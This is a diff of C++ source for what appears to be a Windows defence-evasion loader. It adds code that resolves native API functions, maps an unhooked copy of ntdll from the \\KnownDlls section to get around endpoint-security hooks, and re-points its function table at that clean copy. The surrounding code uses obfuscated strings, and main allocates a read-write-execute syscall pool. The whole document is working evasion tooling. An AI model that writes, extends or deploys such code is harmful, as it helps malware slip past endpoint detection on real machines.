@@ -45,6 +45,8 @@ wchar_t obf_Usr_32[] = { X_C(L'u'), X_C(L's'), X_C(L'e'), X_C(L'r'), X_C(L'3'), 
 
 typedef void* (__stdcall* GenericSyscallType)(...);
 void* FindExportAddress(HMODULE, const char*);
+void InitUnicodeString(UNICODE_STRING& , const wchar_t*);
+NTSTATUS updateFunctions();
 
 //===============================================================================
 
@@ -52,6 +54,10 @@ typedef BOOL (WINAPI* pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
 typedef LPVOID (WINAPI* pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
 typedef DWORD (WINAPI* pGetLastError)(VOID);
 typedef HANDLE (WINAPI* pGetStdHandle)(_In_ DWORD);
+typedef HANDLE (WINAPI* pGetCurrentProcess)(VOID);
+typedef NTSTATUS (NTAPI* pNtOpenSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
+typedef NTSTATUS (NTAPI* pNtMapViewOfSection)(HANDLE, HANDLE, PVOID, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG);
+typedef NTSTATUS (NTAPI* pNtClose)(HANDLE);
 // typedef DWORD (WINAPI* pGetCurrentDirectoryW)(DWORD, LPWSTR);
 
 ////////////////////////////////////////////////////////////////////////////////
@@ -80,6 +86,11 @@ typedef struct _MY_FUNCTIONS
     pVirtualAlloc MyVirtualAlloc;
     pGetLastError MyGetLastError;
     pGetStdHandle MyGetStdHandle;
+    pNtOpenSection MyNtOpenSection;
+    pGetCurrentProcess MyGetCurrentProcess;
+    pNtMapViewOfSection MyNtMapViewOfSection;
+    pNtClose MyNtClose;
+
 }_MY_FUNCTIONS;
 _MY_FUNCTIONS fn;
 
@@ -91,7 +102,7 @@ HMODULE hHookedNtdll = nullptr;
 
 int GetHookedFunctions()
 {
-    norm(GREEN"\n///////////////////GetHookedFunctions()///////////////////");
+    norm("\n=====================GetHookedFunctions()=====================");
 
     HMODULE kernel32Base = NULL;
     HMODULE ntdllBase = NULL;
@@ -198,19 +209,101 @@ int GetHookedFunctions()
         fuk("Failed to get MyGetStdHandle address"); return 0;        
     }norm(GREEN"\t[DONE]");
 
+    fn.MyGetCurrentProcess = (pGetCurrentProcess)FindExportAddress(sLibs.hKERNELBASE, "GetCurrentProcess");
+    if(fn.MyGetCurrentProcess == nullptr)
+    {
+        fuk("Failed to get MyGetCurrentProcess address"); return 0;        
+    }norm(GREEN"\t[DONE]");  
+    
+    fn.MyNtOpenSection = (pNtOpenSection)FindExportAddress(sLibs.hHookedNtdll, "NtOpenSection");
+    if(fn.MyNtOpenSection == nullptr)
+    {
+        fuk("Failed to get MyNtOpenSection address"); return 0;        
+    }norm(GREEN"\t[DONE]");
+
+    fn.MyNtMapViewOfSection = (pNtMapViewOfSection)FindExportAddress(sLibs.hHookedNtdll, "NtMapViewOfSection");
+    if(fn.MyNtMapViewOfSection == nullptr)
+    {
+        fuk("Failed to get MyNtMapViewOfSection address"); return 0;        
+    }norm(GREEN"\t[DONE]");
+
+    fn.MyNtClose = (pNtClose)FindExportAddress(sLibs.hHookedNtdll, "NtClose");
+    if(fn.MyNtClose == nullptr)
+    {
+        fuk("Failed to get MyNtClose address"); return 0;        
+    }norm(GREEN"\t[DONE]");
+
     ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-    norm(GREEN"\n///////////////////GetHookedFunctions()///////////////////\n");
+    norm("\n=====================GetHookedFunctions()=====================\n");
     return 1;
 }
 
-int GetUnhookedDlls()
+NTSTATUS GetUnhookedDlls()
 {
-    norm(GREEN"\n///////////////////GetUnhookedFunctions()///////////////////");
+    norm("\n----------------------GetUnhookedDlls()----------------------");
 
+    UNICODE_STRING usName;
+    OBJECT_ATTRIBUTES objAttr;
+    HANDLE hSection = nullptr;
+    PVOID base = nullptr;
+    SIZE_T viewSize = 0;
 
+    InitUnicodeString(usName, L"\\KnownDlls\\ntdll.dll");
+    InitializeObjectAttributes(&objAttr, &usName, OBJ_CASE_INSENSITIVE, nullptr, nullptr);
 
+    // 2) Open the section
+    NTSTATUS status = fn.MyNtOpenSection(&hSection, SECTION_MAP_EXECUTE | SECTION_MAP_READ, &objAttr);
 
-    norm(GREEN"\n///////////////////GetUnhookedFunctions()///////////////////");
+    if (!NT_SUCCESS(status))
+    {
+        fuk("NtOpenSection failed: 0x%X", status);
+        return 0;
+    }
+
+    // 3) Map the section into our process
+    status = fn.MyNtMapViewOfSection(hSection, fn.MyGetCurrentProcess(), &base, 0, 0, nullptr, &viewSize, ViewShare, 0, PAGE_EXECUTE_READ);
+    
+    if (!NT_SUCCESS(status))
+    {
+        fuk("MyNtMapViewOfSection Failed");
+        return 0;
+    }
+    
+    fn.MyNtClose(hSection);
+    
+    sLibs.hUnhookedNtdll = base;
+    norm("\nClean ntdll.dll address via fallback (KnownDlls :/ ) -> 0x", std::hex, CYAN"", sLibs.hUnhookedNtdll);
+
+    if(!updateFunctions()) { fuk("MyNtMapViewOfSection Failed"); return 0; }
+
+    norm("\n----------------------GetUnhookedDlls()----------------------");
+    return 1;
+}
+
+NTSTATUS updateFunctions()
+{
+    norm("\n\n================UpdateFunctions()================");
+    fn.MyNtOpenSection = (pNtOpenSection)FindExportAddress(sLibs.hUnhookedNtdll, "NtOpenSection");
+    if(fn.MyNtOpenSection == nullptr)
+    {
+        fuk("Failed to get MyNtOpenSection address"); return 0;        
+    }norm(GREEN"\t[DONE]");
+
+    fn.MyNtMapViewOfSection = (pNtMapViewOfSection)FindExportAddress(sLibs.hUnhookedNtdll, "NtMapViewOfSection");
+    if(fn.MyNtMapViewOfSection == nullptr)
+    {
+        fuk("Failed to get MyNtMapViewOfSection address"); return 0;        
+    }norm(GREEN"\t[DONE]");
+
+    fn.MyNtClose = (pNtClose)FindExportAddress(sLibs.hUnhookedNtdll, "NtClose");
+    if(fn.MyNtClose == nullptr)
+    {
+        fuk("Failed to get MyNtClose address"); return 0;        
+    }norm(GREEN"\t[DONE]");
+
+    ok("Updated all the funtions");
+    norm("\n================UpdateFunctions()================");
+
     return 1;
 }
 
@@ -668,7 +761,7 @@ int main()
 
     if(!GetHookedFunctions()) return 1;
     if(!GetUnhookedDlls()) return 1;
-    else { ok("Bye"); return 0; }
+    // else { ok("Bye"); return 0; }
     ///////////////////////////////////////////////////////////////////////////////////////////////////////////
 
     pSyscallPool = static_cast<BYTE*>(fn.MyVirtualAlloc(nullptr, MAX_SYSCALLS * 0x40, 0x00001000 | 0x00002000, 0x40));
